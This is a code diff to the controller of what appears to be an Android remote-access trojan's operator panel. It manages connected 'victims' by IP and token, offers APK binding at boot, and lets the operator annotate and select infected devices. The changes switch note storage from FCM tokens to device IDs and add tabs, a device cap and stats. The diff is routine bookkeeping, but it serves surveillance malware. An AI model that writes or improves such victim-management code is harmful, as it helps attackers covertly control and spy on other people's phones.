@@ -37,6 +37,8 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.isVictimSelected = true;
     $appCtrl.selectedVictim = null;
     $appCtrl.selectedVictimKey = null;
+    $appCtrl.activeTab = 'online'; // Default tab
+    $appCtrl.allDevices = {}; // Store all saved devices
     $appCtrl.bindApk = {
         enable: false, method: 'BOOT'
     }; //default values for binding apk
@@ -45,7 +47,8 @@ app.controller("AppCtrl", ($scope) => {
     $appCtrl.deviceStats = {
         total: 0,
         online: 0,
-        withNotes: 0
+        withNotes: 0,
+        maxDevices: 2
     };
 
     var log = document.getElementById("log");
@@ -108,9 +111,8 @@ app.controller("AppCtrl", ($scope) => {
             console.log('New victim connected:', index);
             viclist[index] = victimsList.getVictim(index);
 
-            // Load note from device manager (ưu tiên fcmToken)
-            const fcmToken = viclist[index]?.fcmToken || null;
-            ipcRenderer.send('getDeviceNote', index, fcmToken);
+            // Load note from device manager using deviceId
+            ipcRenderer.send('getDeviceNote', index);
 
             $appCtrl.Log('[¡] New victim from ' + viclist[index].ip, CONSTANTS.logStatus.INFO);
             $appCtrl.updateDeviceStats();
@@ -165,11 +167,10 @@ app.controller("AppCtrl", ($scope) => {
             victim.isEditingNote = false;
             delete victim.tempNote;
 
-            // Always use fcmToken if available
-            const fcmToken = victim.fcmToken || null;
-            ipcRenderer.send('updateDeviceNote', fcmToken || key, newNote, fcmToken);
+            // Use deviceId for updating note
+            ipcRenderer.send('updateDeviceNote', key, newNote);
 
-            $appCtrl.Log(`[✓] Note updated for device ${fcmToken || key}: ${newNote}`, CONSTANTS.logStatus.SUCCESS);
+            $appCtrl.Log(`[✓] Note updated for device ${key}: ${newNote}`, CONSTANTS.logStatus.SUCCESS);
             $appCtrl.updateDeviceStats();
             $appCtrl.$apply();
         }
@@ -187,10 +188,10 @@ app.controller("AppCtrl", ($scope) => {
     // Handle get device note response
     ipcRenderer.on('getDeviceNoteResponse', (event, response) => {
         if (response.success && response.note) {
-            // Update the correct victim by matching both key and fcmToken
+            // Update the correct victim by matching deviceId
             for (let key in viclist) {
                 const victim = viclist[key];
-                if (victim && (victim.fcmToken === response.fcmToken || key === response.key)) {
+                if (victim && key === response.deviceId) {
                     victim.note = response.note;
                     break;
                 }
@@ -202,7 +203,16 @@ app.controller("AppCtrl", ($scope) => {
     // Handle get all devices response
     ipcRenderer.on('getAllDevicesResponse', (event, response) => {
         if (response.success) {
+            $appCtrl.allDevices = response.devices;
             $appCtrl.deviceStats.total = Object.keys(response.devices).length;
+            $appCtrl.$apply();
+        }
+    });
+
+    // Handle get device stats response
+    ipcRenderer.on('getDeviceStatsResponse', (event, response) => {
+        if (response.success) {
+            $appCtrl.deviceStats = response.stats;
             $appCtrl.$apply();
         }
     });
@@ -216,9 +226,8 @@ app.controller("AppCtrl", ($scope) => {
                 if (viclist[$appCtrl.selectedVictimKey]) {
                     viclist[$appCtrl.selectedVictimKey].note = newNote;
                 }
-                // Always use fcmToken if available
-                const fcmToken = $appCtrl.selectedVictim.fcmToken || null;
-                ipcRenderer.send('updateDeviceNote', fcmToken || $appCtrl.selectedVictimKey, newNote, fcmToken);
+                // Use deviceId for updating note
+                ipcRenderer.send('updateDeviceNote', $appCtrl.selectedVictimKey, newNote);
                 $appCtrl.Log(`[✓] Note updated for selected device: ${newNote}`, CONSTANTS.logStatus.SUCCESS);
                 $appCtrl.updateDeviceStats();
                 $appCtrl.$apply();
@@ -234,8 +243,9 @@ app.controller("AppCtrl", ($scope) => {
         $appCtrl.deviceStats.online = onlineCount;
         $appCtrl.deviceStats.withNotes = withNotesCount;
 
-        // Get total devices from device manager
+        // Get total devices and stats from device manager
         ipcRenderer.send('getAllDevices');
+        ipcRenderer.send('getDeviceStats');
     };
 
     $appCtrl.openLab = (index) => {
@@ -256,6 +266,12 @@ app.controller("AppCtrl", ($scope) => {
             console.log('Selecting victim:', key, victim);
             $appCtrl.selectedVictim = victim;
             $appCtrl.selectedVictimKey = key;
+
+            // If selecting from "All Saved Devices" tab and device is offline, show message
+            if ($appCtrl.activeTab === 'all' && !victim.isOnline) {
+                $appCtrl.Log(`[!] Device ${key} is currently offline`, CONSTANTS.logStatus.WARNING);
+            }
+
             $appCtrl.$apply();
         } catch (error) {
             console.error('Error selecting victim:', error);
